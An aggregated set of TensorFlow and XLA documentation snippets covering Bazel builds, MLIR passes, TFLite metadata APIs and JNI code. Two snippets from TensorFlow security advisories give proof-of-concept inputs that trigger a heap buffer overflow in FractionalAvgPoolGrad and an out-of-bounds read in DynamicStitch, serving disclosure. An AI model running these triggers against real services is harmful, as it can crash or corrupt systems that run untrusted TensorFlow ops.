LANGUAGE: Python
CODE:
```
M = 1024
K = 512
N = 2048
key = jax.random.PRNGKey(1701)
a = jax.random.randint(key, (M, K), dtype=jax.numpy.int8, minval=0, maxval=255)
b = jax.random.normal(key, (K, N), dtype=jax.dtypes.bfloat16)

print(jax.xla_computation(f)(a, b).as_hlo_text())
```

----------------------------------------

TITLE: Setting Hermetic CUDA/CUDNN Versions (Shell/Bazel)
DESCRIPTION: Explains three methods for setting the HERMETIC_CUDA_VERSION and HERMETIC_CUDNN_VERSION environment variables that control which specific versions of CUDA and CUDNN Bazel will download and use. These variables are crucial for reproducible builds using the hermetic approach.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/hermetic_cuda.md#_snippet_0

LANGUAGE: Bazel config
CODE:
```
# Add an entry to your `.bazelrc` file
build:cuda --repo_env=HERMETIC_CUDA_VERSION="12.6.3"
build:cuda --repo_env=HERMETIC_CUDNN_VERSION="9.3.0"
```

LANGUAGE: Shell
CODE:
```
# OR pass it directly to your specific build command
bazel build --config=cuda <target> \
--repo_env=HERMETIC_CUDA_VERSION="12.6.3" \
--repo_env=HERMETIC_CUDNN_VERSION="9.3.0"
```

LANGUAGE: Shell
CODE:
```
# If .bazelrc doesn't have corresponding entries and the environment variables
# are not passed to bazel command, you can set them globally in your shell:
export HERMETIC_CUDA_VERSION="12.6.3"
export HERMETIC_CUDNN_VERSION="9.3.0"
```

----------------------------------------

TITLE: Build TFLite Benchmark Framework with Profiling (Shell)
DESCRIPTION: Executes the shell script with the `-p` option to build the TFLite benchmark framework. This option enables more detailed profiling information during benchmark execution.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/ios/README.md#_snippet_1

LANGUAGE: Shell
CODE:
```
build_benchmark_framework.sh -p
```

----------------------------------------

TITLE: Implementing a Basic C++ Code Generator using pyct
DESCRIPTION: Defines a custom AST visitor `BasicCppCodegen` by inheriting from `transformer.CodeGenerator`. It overrides `visit_*` methods to generate basic C++ code strings from corresponding Python AST nodes (Names, arguments, FunctionDef, Call). This demonstrates how to traverse an AST and output a target language representation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/pyct_tutorial.ipynb#_snippet_1

LANGUAGE: python
CODE:
```
import gast
from tensorflow.python.autograph.pyct import transformer

class BasicCppCodegen(transformer.CodeGenerator):

  def visit_Name(self, node):
    self.emit(node.id)

  def visit_arguments(self, node):
    self.visit(node.args[0])
    for arg in node.args[1:]:
      self.emit(', ')
      self.visit(arg)

  def visit_FunctionDef(self, node):
    self.emit('void {}'.format(node.name))
    self.emit('(')
    self.visit(node.args)
    self.emit(') {\n')
    self.visit_block(node.body)
    self.emit('\n}')

  def visit_Call(self, node):
    self.emit(node.func.id)
    self.emit('(')
    self.visit(node.args[0])
    for arg in node.args[1:]:
      self.emit(', ')
      self.visit(arg)
    self.emit(');')
```

----------------------------------------

TITLE: Building LLVM/MLIR Dependency - Bash
DESCRIPTION: Executes a script to configure and build the LLVM/MLIR dependency using the specified source and build directories. This step prepares the MLIR libraries required by MLIR-HLO.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/README.md#_snippet_2

LANGUAGE: Bash
CODE:
```
build_tools/build_mlir.sh ${PWD}/llvm-project/ ${PWD}/llvm-build
```

----------------------------------------

TITLE: Defining and Caching Source Directory Variable
DESCRIPTION: This command defines a CMake variable `ML_DTYPES_SOURCE_DIR`. It's initialized as an empty string and marked as a CACHE variable of type PATH, allowing users to specify the directory containing the ml_dtypes source code when configuring the project.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/ml_dtypes/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
set(ML_DTYPES_SOURCE_DIR "" CACHE PATH
  "Directory that contains the ml_dtypes project"
)
```

----------------------------------------

TITLE: Parallel Bazel Build Analysis JAX GPU (Shell)
DESCRIPTION: Uses the `parallel` command to run a `bazel build` command in parallel for JAX GPU targets. It includes specific tag filters (excluding multi-accelerator), uses the RBE configuration for CUDA, sets JAX and TensorFlow environment variables, overrides the Python version and XLA repository, and configures output and profiling options. The `--nobuild` flag means it checks dependencies and configuration but doesn't perform the actual compilation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_4

LANGUAGE: shell
CODE:
```
parallel --ungroup --retries 3 --delay 15 --nonall -- bazel build --build_tag_filters=-multiaccelerator --test_tag_filters=-multiaccelerator --config=rbe_linux_x86_64_cuda --test_env=JAX_SKIP_SLOW_TESTS=1 --test_env=TF_CPP_MIN_LOG_LEVEL=0 --test_env=JAX_EXCLUDE_TEST_TARGETS=PmapTest.testSizeOverflow --repo_env=HERMETIC_PYTHON_VERSION=3.10 --override_repository=xla=$GITHUB_WORKSPACE/openxla/xla --color=yes --test_output=errors --verbose_failures --keep_going --nobuild_tests_only --profile=profile.json.gz --flaky_test_attempts=3 --jobs=150 --bes_upload_mode=fully_async --nobuild -- //tests:gpu_tests //tests:backend_independent_tests
```

----------------------------------------

TITLE: Computing Cosine Similarity TFLite AudioEmbedder Python
DESCRIPTION: Computes the cosine similarity between two feature vectors obtained from the AudioEmbedder. Requires two `FeatureVector` objects as input and returns a float representing their similarity.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioEmbedder.md#_snippet_1

LANGUAGE: python
CODE:
```
cosine_similarity(
    u: tflite_support.task.processor.FeatureVector,
    v: tflite_support.task.processor.FeatureVector
) -> float
```

----------------------------------------

TITLE: Import TFLite Module (Swift)
DESCRIPTION: Imports the TensorFlowLite module into a Swift source file, making the library's functionality available.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ios.md#_snippet_9

LANGUAGE: Swift
CODE:
```
import TensorFlowLite
```

----------------------------------------

TITLE: Defining Tuple Shapes for XLA Custom Calls in C++
DESCRIPTION: Illustrates how to use `xla::ShapeUtil` to define complex tuple shapes, including nested tuples, for inputs and outputs of an XLA custom call. It shows creating these shapes and using the resulting `Shape` objects when defining a `Parameter` and a `CustomCall` instruction with `xla::XlaBuilder`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/custom_call.md#_snippet_17

LANGUAGE: C++
CODE:
```
using xla::ShapeUtil;
using xla::F32;
Shape p0_shape = ShapeUtil::MakeTuple({
    ShapeUtil::MakeShape(F32, {32}),
    ShapeUtil::MakeTuple({
        ShapeUtil::MakeShape(F32, {64}),
        ShapeUtil::MakeShape(F32, {128}),
    }),
    ShapeUtil::MakeShape(F32, {256}),
});
xla::XlaOp p0 = xla::Parameter(0, p0_shape, "p0");

Shape out_shape = ShapeUtil::MakeTuple({
  ShapeUtil::MakeShape(F32, {512}),
  ShapeUtil::MakeShape(F32, {1024}),
});
xla::CustomCall(&b, "do_custom_call", /*operands=*/{p0}, out_shape, ...);
```

----------------------------------------

TITLE: Binding XLA FFI Handler with Lazy Attribute Decoding
DESCRIPTION: Demonstrates creating an XLA FFI handler that receives all custom call attributes as a `Dictionary` object. Individual attributes can then be retrieved and decoded by name and type at runtime using the `get<T>(name)` method.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/custom_call.md#_snippet_11

LANGUAGE: C++
CODE:
```
auto handler = Ffi::Bind().Attrs().To([](Dictionary attrs) -> Error {
  ErrorOr<int32_t> i32 = attrs.get<int32_t>("i32");
  return Error::Success();
});
```

----------------------------------------

TITLE: Getting Root as CustomMetadata Specific Method in Python
DESCRIPTION: A class method specifically designed to initialize a `CustomMetadata` object from a FlatBuffers buffer starting at a given offset. Note: This method is deprecated; use `GetRootAs` instead.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/CustomMetadata.md#_snippet_6

LANGUAGE: python
CODE:
```
@classmethod
GetRootAsCustomMetadata(
    buf, offset=0
)
```

----------------------------------------

TITLE: Defining GRAYSCALE ColorSpaceType Constant (Python)
DESCRIPTION: Represents the integer value assigned to the GRAYSCALE color space type in the TFLite Support metadata schema. This value is used to identify grayscale image data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ColorSpaceType.md#_snippet_2

LANGUAGE: Python
CODE:
```
2
```

----------------------------------------

TITLE: Lowering tfl.add (Quantized) to TOSA MLIR
DESCRIPTION: Documents the lowering of the quantized TensorFlow Lite `tfl.add` operation to a sequence of TOSA operations. This involves `tosa.RESCALE` operations to handle quantization scales and zero points before and after the `tosa.ADD` operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_52

LANGUAGE: MLIR
CODE:
```
%output = tfl.add(%lhs, %rhs)
```

LANGUAGE: MLIR
CODE:
```
%op1_rescale_lhs = tosa.RESCALE(%lhs) {scale=lhs_scale, input_zp=%lhs.zp, output_zp=0} // %lhs.dtype->i32
%op2_rescale_rhs = tosa.RESCALE(%rhs) {scale=rhs_scale, input_zp=%rhs.zp, output_zp=0} // %rhs.dtype->i32
%op3_add_op1_op2 = tosa.ADD(%op1_rescale_lhs, %op2_rescale_rhs)
%op4_rescale_op3 = tosa.RESCALE(%op3_add_op1_op2) {scale=output_scale} // i32->%output.dtype
```

----------------------------------------

TITLE: Run a Specific hlo-opt Pass
DESCRIPTION: This command uses `hlo-opt` to apply a single, specified HLO pass (`schedule-aware-collective-cse`) to an input HLO module (`input.hlo`). This is useful for isolating and debugging individual passes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_14

LANGUAGE: Command Line
CODE:
```
hlo-opt --passes=schedule-aware-collective-cse input.hlo
```

----------------------------------------

TITLE: Compile HLO using hlo-opt Example
DESCRIPTION: This command demonstrates using `hlo-opt` to process an input HLO file (`input.hlo`) for the CPU platform, specifying the output stage as 'hlo' (likely optimized HLO). The output is typically printed to stdout.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_8

LANGUAGE: Command Line
CODE:
```
hlo-opt --platform=cpu --stage=hlo input.hlo
```

----------------------------------------

TITLE: Rewriting Model Parallel Cluster Function MLIR
DESCRIPTION: This MLIR snippet shows the result of applying the `-tf-tpu-rewrite` pass to a model-parallel `tf_device.cluster_func`. Compilation happens on the CPU, yielding multiple program handles. Execution is orchestrated using `tf_device.parallel_execute` and `tf_device.launch` across multiple TPU devices, reflecting the model parallelism.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_68

LANGUAGE: mlir
CODE:
```
func @tf_tpu_rewrite(%arg0: tensor<8xi32>) -> tensor<8xi32> {
  %0:3 = "tf_device.launch"() ( {
    %compilation_status, %program:2 = "tf._TPUCompileMlir"() {mlir_module = "<serialized func>"} : () -> (tensor<!tf_type.string>, tensor<3x!tf_type.string>, tensor<3x!tf_type.string>)
    tf_device.return %compilation_status, %program#0, %program#1 : tensor<!tf_type.string>, tensor<3x!tf_type.string>, tensor<3x!tf_type.string>
  }) {device = "/job:localhost/replica:0/task:0/device:CPU:0"} : () -> (tensor<!tf_type.string>, tensor<3x!tf_type.string>, tensor<3x!tf_type.string>)
  "tf_device.launch"() ( {
    "tf.TPUCompileSucceededAssert"(%0#0) : (tensor<!tf_type.string>) -> ()
    tf_device.return
  }) {device = "/job:localhost/replica:0/task:0/device:CPU:0"} : () -> ()
  %1 = "tf_device.parallel_execute"() ( {
    %2 = "tf_device.launch"() ( {
      %3 = "tf.TPUExecute"(%arg0, %0#1) : (tensor<8xi32>, tensor<3x!tf_type.string>) -> tensor<8xi32>
      tf_device.return %3 : tensor<8xi32>
    }) {device = "/job:localhost/replica:0/task:0/device:TPU:0"} : () -> tensor<8xi32>
    tf_device.return %2 : tensor<8xi32>
  },  {
    "tf_device.launch"() ( {
      "tf.TPUExecute"(%0#2) : (tensor<3x!tf_type.string>) -> ()
      tf_device.return
  }) {device = "/job:localhost/replica:0/task:0/device:TPU:1"} : () -> ()
    tf_device.return
  }) : () -> tensor<8xi32>
  return %1 : tensor<8xi32>
}
```

----------------------------------------

TITLE: Listing Generated HLO Dump Files Bash
DESCRIPTION: This command lists files ending with `before_optimizations.txt` in the HLO dump directory (`/tmp/dump`), sorted by size (`-S`) in a human-readable format (`-h`), showing details (`-l`). This helps identify the largest or main HLO graph file generated by the previous step.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools_multihost_hlo_runner.md#_snippet_3

LANGUAGE: bash
CODE:
```
ls -lSh /tmp/dump/*before_optimizations.txt
```

----------------------------------------

TITLE: Check Bazel Version - Shell
DESCRIPTION: Outputs the currently installed version of the Bazel build tool. This confirms that the expected version is available before starting the build and test process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_17

LANGUAGE: Shell
CODE:
```
bazel --version
```

----------------------------------------

TITLE: Configuring Custom Dataset Usage (Python)
DESCRIPTION: Defines boolean parameters `use_custom_dataset` and `dataset_is_split`. `use_custom_dataset` enables using a user-provided image dataset. `dataset_is_split` indicates if the custom dataset is already organized into 'train' and 'test' subdirectories.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_5

LANGUAGE: Python
CODE:
```
use_custom_dataset = False #@param ["False", "True"] {type:"raw"}

dataset_is_split = False #@param ["False", "True"] {type:"raw"}
```

----------------------------------------

TITLE: Defining Replicated TPU Computation MLIR
DESCRIPTION: Example showing a replicated TensorFlow TPU computation in MLIR dialect. It includes `tf.TPUReplicateMetadata` (`num_relicas = 2`), `tf.TPUReplicatedInput`, `tf.Identity`, and `tf.TPUReplicatedOutput` operations, representing the structure before the clustering pass.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_48

LANGUAGE: mlir
CODE:
```
func @tpu_computation(%arg0: tensor<i32>, %arg1: tensor<i32>) -> (tensor<i32>, tensor<i32>) {
  "tf.TPUReplicateMetadata"() {_xla_compile_device_type = "TPU", _replication_info = "cluster", num_relicas = 2, num_cores_per_replica = 1, topology = "topology", device_assignment = [], padding_map = []} : () -> ()
  %replicated_input = "tf.TPUReplicatedInput"(%arg0, %arg1) : (tensor<i32>, tensor<i32>) -> tensor<i32>
  %identity = "tf.Identity"(%replicated_input) {_xla_compile_device_type = "TPU", _replication_info = "cluster"} : (tensor<i32>) -> tensor<i32>
  %replicated_output:2 = "tf.TPUReplicatedOutput"(%identity) : (tensor<i32>) -> (tensor<i32>, tensor<i32>)
  return %replicated_output#0, %replicated_output#1 : tensor<i32>, tensor<i32>
}
```

----------------------------------------

TITLE: Conditionally Add External Delegate Source (CMake)
DESCRIPTION: This block conditionally adds the external delegate provider source file to the `TFLITE_BENCHMARK_SRCS` list if the CMake option `TFLITE_ENABLE_EXTERNAL_DELEGATE` is set, allowing the benchmark tool to load external delegates.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/CMakeLists.txt#_snippet_5

LANGUAGE: CMake
CODE:
```
if(TFLITE_ENABLE_EXTERNAL_DELEGATE)
  list(APPEND TFLITE_BENCHMARK_SRCS
    ${TFLITE_SOURCE_DIR}/tools/delegates/external_delegate_provider.cc
  )
endif()
```

----------------------------------------

TITLE: Checking Equality with __eq__ (Python)
DESCRIPTION: Compares the current `CluResponse` object with another object to check for equality. This method is typically used for object comparison.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/CluResponse.md#_snippet_1

LANGUAGE: Python
CODE:
```
__eq__(
    other: Any
) -> bool
```

----------------------------------------

TITLE: MLIR stablehlo.custom_call with Attributes
DESCRIPTION: An example `stablehlo.custom_call` operation in MLIR demonstrating how attributes are passed using the `backend_config` dictionary. This custom call includes an integer and a string attribute.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/custom_call.md#_snippet_7

LANGUAGE: MLIR
CODE:
```
%0 = "stablehlo.custom_call"(%arg0) {
  call_target_name = "foo",
  backend_config= {
    i32 = 42 : i32,
    str = "string"
  },
  api_version = 4 : i32
} : (tensor<f32>) -> tensor<f32>
```

----------------------------------------

TITLE: Get Mean Array Length Python
DESCRIPTION: This method returns the number of elements in the mean array. It indicates the dimensionality of the mean values provided in the normalization options.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptions.md#_snippet_6

LANGUAGE: Python
CODE:
```
MeanLength()
```

----------------------------------------

TITLE: Initializing TensorMetadataT from Object Python
DESCRIPTION: This class method initializes a `TensorMetadataT` object from an existing `TensorMetadataT` object. It takes the source `tensorMetadata` object as input.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadataT.md#_snippet_2

LANGUAGE: Python
CODE:
```
@classmethod
InitFromObj(
    tensorMetadata
)
```

----------------------------------------

TITLE: Checking Equality of ColoredLabel Objects in Python
DESCRIPTION: Compares this `ColoredLabel` object with another object to determine if they are equal. It takes any object as input and returns a boolean value indicating equality.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/ColoredLabel.md#_snippet_1

LANGUAGE: python
CODE:
```
__eq__(
    other: Any
) -> bool

```

----------------------------------------

TITLE: Accessing Image Color Space (Python)
DESCRIPTION: Retrieves the color space property of the image metadata. This method is likely an instance method called on an `ImageProperties` object and requires no parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImageProperties.md#_snippet_0

LANGUAGE: python
CODE:
```
ColorSpace()
```

----------------------------------------

TITLE: Implementing BertQuestionAnswerer JNI (C++)
DESCRIPTION: This C++ snippet provides the JNI implementation for the `BertQuestionAnswerer` Java API. It shows how Java calls (`initJniWithBertByteBuffers`, `answerNative`, `deinitJni`) are received in C++, how Java objects (ByteBuffers, Strings, long handle) are processed or cast to native types, how native C++ logic (`CreateFromBuffer`, `Answer`, `delete`) is executed, and how native results (pointer, vector<QaAnswer>) are converted back to Java types (jlong, jobjectArray/List).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/customized_task_api.md#_snippet_7

LANGUAGE: cpp
CODE:
```
  // Implements BertQuestionAnswerer::initJniWithBertByteBuffers
  extern "C" JNIEXPORT jlong JNICALL
  Java_org_tensorflow_lite_task_text_qa_BertQuestionAnswerer_initJniWithBertByteBuffers(
      JNIEnv* env, jclass thiz, jobjectArray model_buffers) {
    // Convert Java ByteBuffer object into a buffer that can be read by native factory functions
    absl::string_view model =
        GetMappedFileBuffer(env, env->GetObjectArrayElement(model_buffers, 0));

    // Creates the native API object
    absl::StatusOr<std::unique_ptr<QuestionAnswerer>> status =
        BertQuestionAnswerer::CreateFromBuffer(
            model.data(), model.size());
    if (status.ok()) {
      // converts the object pointer to jlong and return to Java.
      return reinterpret_cast<jlong>(status->release());
    } else {
      return kInvalidPointer;
    }
  }

  // Implements BertQuestionAnswerer::answerNative
  extern "C" JNIEXPORT jobject JNICALL
  Java_org_tensorflow_lite_task_text_qa_BertQuestionAnswerer_answerNative(
  JNIEnv* env, jclass thiz, jlong native_handle, jstring context, jstring question) {
  // Convert long to native API object pointer
  QuestionAnswerer* question_answerer = reinterpret_cast<QuestionAnswerer*>(native_handle);

  // Calls the native API
  std::vector<QaAnswer> results = question_answerer->Answer(JStringToString(env, context),
                                         JStringToString(env, question));

  // Converts native result(std::vector<QaAnswer>) to Java result(List<QaAnswerer>)
  jclass qa_answer_class =
    env->FindClass("org/tensorflow/lite/task/text/qa/QaAnswer");
  jmethodID qa_answer_ctor =
    env->GetMethodID(qa_answer_class, "<init>", "(Ljava/lang/String;IIF)V");
  return ConvertVectorToArrayList<QaAnswer>(
    env, results,
    [env, qa_answer_class, qa_answer_ctor](const QaAnswer& ans) {
      jstring text = env->NewStringUTF(ans.text.data());
      jobject qa_answer =
          env->NewObject(qa_answer_class, qa_answer_ctor, text, ans.pos.start,
                         ans.pos.end, ans.pos.logit);
      env->DeleteLocalRef(text);
      return qa_answer;
    });
  }

  // Implements BaseTaskApi::deinitJni by delete the native object
  extern "C" JNIEXPORT void JNICALL Java_task_core_BaseTaskApi_deinitJni(
      JNIEnv* env, jobject thiz, jlong native_handle) {
    delete reinterpret_cast<QuestionAnswerer*>(native_handle);
  }
```

----------------------------------------

TITLE: Getting List of Packed Associated Files in TFLite Metadata in Python
DESCRIPTION: Defines the method signature for `get_packed_associated_file_list`. This method returns a list containing the names of all associated files that are packed within the TFLite model. It returns a list of strings.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/MetadataDisplayer.md#_snippet_4

LANGUAGE: python
CODE:
```
get_packed_associated_file_list()
```

----------------------------------------

TITLE: Illustrating Placeholder Pattern in TensorFlow Function (Python)
DESCRIPTION: This snippet shows a pattern using `tf.Placeholder` within a `@tf.function`. While this would typically fail in eager mode, it worked in TensorFlow V1 graph mode provided graph optimizations like inlining and pruning removed the placeholder before execution, highlighting a potential source of confusion or a leaky abstraction in V2 tracing that relied on graph mode behavior.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ir/README.md#_snippet_0

LANGUAGE: Python
CODE:
```
  @tf.function
  def foo(z):
    x = tf.Placeholder(tf.int32)
    y, _ = bar(x, z)
    return y
```

----------------------------------------

TITLE: Output of Tracing Behavior Example - Text Output
DESCRIPTION: This is the output from the preceding Python code snippet. It shows that the `print` statements inside *both* the `true branch` and the `false branch` were executed, demonstrating that the TensorFlow tracer visits both paths during graph construction when the condition is a `tf.Tensor`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_9

LANGUAGE: text
CODE:
```
before if
true branch
false branch
after if
```

----------------------------------------

TITLE: Running a Single Bazel Test Method with Filter - Bash
DESCRIPTION: Runs Bazel tests for a specific target but limits execution to test methods matching the provided `--test_filter` pattern (e.g., `*LoadTest.test_capture_variables*`). This allows running just one or a few specific test methods within a larger test suite. Requires Python >= 3.7.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/CONTRIBUTING.md#_snippet_12

LANGUAGE: bash
CODE:
```
bazel test ${flags} //tensorflow/python/saved_model:load_test --test_filter=*LoadTest.test_capture_variables*
```

----------------------------------------

TITLE: Download Bazelisk (X86) - Shell
DESCRIPTION: Downloads the Bazelisk executable for macOS AMD64 (X86) from its GitHub releases page using `wget`. The `--no-verbose` flag reduces output, and `-O` specifies the output file path.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_21

LANGUAGE: Shell
CODE:
```
sudo wget --no-verbose -O /usr/local/bin/bazel https://github.com/bazelbuild/bazelisk/releases/download/v1.11.0/bazelisk-darwin-amd64
```

----------------------------------------

TITLE: Initializing BertTokenizerMd Class (Python)
DESCRIPTION: Initializes an instance of the `BertTokenizerMd` class, preparing it to hold and generate metadata for a Bert tokenizer. It requires the file path to the vocabulary file used by the tokenizer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/BertTokenizerMd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_writers.metadata_info.BertTokenizerMd(
    vocab_file_path: str
)
```

----------------------------------------

TITLE: Initializing TFLite AudioEmbedder Class Python
DESCRIPTION: Initializes the AudioEmbedder instance with specific options and a C++ backend implementation. This is the standard constructor used internally, while `create_from_options` and `create_from_file` are the recommended public factory methods.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioEmbedder.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.audio.AudioEmbedder(
    options: tflite_support.task.audio.AudioEmbedderOptions,
    cpp_embedder: _CppAudioEmbedder
) -> None
```

----------------------------------------

TITLE: Demonstrating Heap Buffer Overflow in TensorFlow FractionalAvgPoolGrad Python
DESCRIPTION: This Python snippet demonstrates how to trigger a heap buffer overflow vulnerability in `tf.raw_ops.FractionalAvgPoolGrad`. It defines specific input tensors for `orig_input_tensor_shape`, `out_backprop`, `row_pooling_sequence`, and `col_pooling_sequence` that exploit a lack of validation in the operation's underlying C++ implementation, leading to potential memory corruption or a crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-067.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

orig_input_tensor_shape = tf.constant([1, 3, 2, 3], shape=[4], dtype=tf.int64)
out_backprop = tf.constant([2], shape=[1, 1, 1, 1], dtype=tf.int64)
row_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)
col_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)


tf.raw_ops.FractionalAvgPoolGrad(
  orig_input_tensor_shape=orig_input_tensor_shape, out_backprop=out_backprop,
  row_pooling_sequence=row_pooling_sequence,
  col_pooling_sequence=col_pooling_sequence, overlapping=False)
```

----------------------------------------

TITLE: Generating GPU MLIR Pass Declarations with TableGen - CMake
DESCRIPTION: Invokes `mlir_tablegen` using the GPU-specific definition file (`gpu_passes.td`). The `-gen-pass-decls` flag generates declarations for MLIR GPU passes, and `-name LMHLOGPUTransforms` specifies the namespace or prefix for these declarations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/transforms/CMakeLists.txt#_snippet_4

LANGUAGE: CMake
CODE:
```
mlir_tablegen(gpu_passes.h.inc -gen-pass-decls -name LMHLOGPUTransforms)
```

----------------------------------------

TITLE: Demonstrating DynamicStitch OOB read Vulnerability - Python
DESCRIPTION: This Python snippet uses TensorFlow to demonstrate an out-of-bounds read vulnerability in the `tf.raw_ops.DynamicStitch` operation. It initializes the `DynamicStitch` function and calls it with a dictionary of parameters (`para`) where the `indices` and `data` inputs are crafted to potentially trigger the vulnerability, specifically using an unusual value in `indices` and mismatched shapes, which can lead to a stack OOB read as described in the security advisory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2023-018.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
func = tf.raw_ops.DynamicStitch
para={'indices': [[0xdeadbeef], [405], [519], [758], [1015]], 'data': [[110.27793884277344], [120.29475402832031], [157.2418212890625], [157.2626953125], [188.45382690429688]]}
y = func(**para)
```

----------------------------------------

TITLE: Run Lightweight hlo-opt for Format Conversion (Bazel)
DESCRIPTION: This command executes the light-weight `hlo-opt` tool using Bazel, specifically for converting HLO module formats (e.g., text to proto or proto to text).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_20

LANGUAGE: Bazel
CODE:
```
bazel run //xla/hlo/tools:hlo-opt -- [flags] <filename>
```

----------------------------------------

TITLE: Checking for Input Tensor Metadata in Python
DESCRIPTION: Checks if the input tensor metadata field is present or null within the schema. Use this method to verify if input tensor metadata exists.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_17

LANGUAGE: python
CODE:
```
InputTensorMetadataIsNone()
```

----------------------------------------

TITLE: Get Process Unit - TensorMetadata (Python)
DESCRIPTION: Retrieves the process unit metadata object at the specified index j. This allows accessing details about data processing steps applied to the tensor.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadata.md#_snippet_12

LANGUAGE: python
CODE:
```
ProcessUnits(
    j
)
```

----------------------------------------

TITLE: Installing libffi7 Package on Ubuntu
DESCRIPTION: Downloads and installs the libffi7 package from an Ubuntu archive. This is an optional step required on Ubuntu 20.10 or later for certain dependencies. Requires root privileges for installation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/minimal/README.md#_snippet_1

LANGUAGE: sh
CODE:
```
wget http://es.archive.ubuntu.com/ubuntu/pool/main/libf/libffi/libffi7_3.3-4_amd64.deb
sudo dpkg -i libffi7_3.3-4_amd64.deb
```

----------------------------------------

TITLE: Setting Delegate File Permissions - Shell
DESCRIPTION: Sets the file permissions for the built sample stable delegate shared object file. Granting 755 permissions ensures the file can be read and executed, and allows overwriting if a previous version exists in the destination directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/experimental/delegate_performance/android/README.md#_snippet_4

LANGUAGE: Shell
CODE:
```
chmod 755 bazel-bin/tensorflow/lite/delegates/utils/experimental/sample_stable_delegate/libtensorflowlite_sample_stable_delegate.so
```

----------------------------------------

TITLE: Setting InvalidArgument Status in TensorFlow C++
DESCRIPTION: This C++ snippet shows how an `InvalidArgument` status is set within the TensorFlow C++ API. It's used to indicate that a specific data type is not supported by the DLPack interface, providing a descriptive error message during validation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-024.md#_snippet_0

LANGUAGE: C++
CODE:
```
      status->status = tensorflow::errors::InvalidArgument(
